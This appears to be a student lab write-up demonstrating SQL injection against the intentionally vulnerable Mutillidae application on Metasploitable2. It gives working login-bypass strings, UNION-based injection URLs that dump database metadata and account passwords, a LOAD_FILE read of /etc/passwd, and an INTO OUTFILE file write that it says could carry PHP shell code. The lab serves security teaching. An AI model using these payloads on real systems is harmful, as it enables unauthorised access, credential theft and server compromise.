# sqlinjection
Exploiting SQL Injection vulnerability.

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

![exp8_1](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/fb0ad92a-d2a1-4672-8d48-8f06db522ca6)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![exp8_2](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/6939ad13-70e6-4d77-8674-edf4b26acb0c)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![exp8_3](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/77609950-245d-46e4-992d-b686cefa49b2)


Click on the menu Login/Register and register for an account

![exp8_4](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/a59cb513-7c53-46b6-856b-b86c2c132569)


Click on the link “Please register here”

![exp8_5](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/f295ad3f-58ae-4c94-84eb-7f9c485c229b)


Click on “Create Account” to display the following page:

![exp8_6](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/3c0f9cc1-11fe-4f96-bdb5-f0e6c2817840)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.


![exp8_7](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/408663ad-aec6-441a-8371-0e6e32dc04bc)


Click “Login”. The logged in page will show as below:

![exp8_8](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/8a885442-9683-4eca-b1f2-7e184eccfb1f)


## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![exp8_9](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/f80b9d11-55f7-465f-80d6-b8e2eed7ee6c)


Click the login button and you will see it enter into the administrator page.

![exp8_10](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/2c1db152-513b-4476-8b44-b75d2c077e87)


## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![exp8_11](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/9eee3b5b-3aa7-4217-b223-7a111d4d2a39)


![exp8_12](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/5df11f96-b65c-4e2c-a9a2-43ed7a6e8794)

![exp8_13](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/f555b5dc-7d4e-4a14-8b96-bdc8bd2e79c7)

![exp8_14](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/b3135731-d39c-4c4c-93af-7d50606bb1ec)

![exp8_15](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/93e8c69d-817b-4cb7-9f20-faace1628137)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![exp8_16](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/fcac23e8-1d9c-41a8-a7d1-6c72074cff0e)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![exp8_17](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/c4ea6e3a-e38d-4484-a14b-32bd20447662)


After adding the order by 6 into the existing url , the following error statement will be obtained:

![exp8_18](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/40c1c5de-95c8-4e34-9855-8a8b63512d06)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.


![exp8_19](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/d318b0e8-f271-4fe3-b4b1-788e403554d6)

As it is having 5 columns the query worked fine and it provides the correct result


![exp8_20](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/a4870e38-bae9-4435-9750-7c91d9251243)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![exp8_21](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/96ad141f-f46d-4dbc-b270-e6e1b09faadb)


As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![exp8_22](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/460a3daf-a57b-4266-832f-a131b406db98)


Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details


![exp8_23](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/e4caecae-a200-4288-801e-87a87b4d18e2)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![exp8_24](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/874c9e63-693b-4ba0-a927-5bb5d9998653)


The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.



![exp8_25](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/0f411c27-3c6c-4ac5-b10d-5af18ceb763f)


The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 


![exp8_26](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/f19bb4e8-1b1a-4732-9cfb-3822d1f2fdd2)



Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![exp8_27](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/18461a46-504f-4ed1-b7d6-73619c29df4d)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![exp8_28](https://github.com/Skanthasishanth/sqlinjection/assets/118298456/4e331776-95a4-4555-8b42-c30c0855b078)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
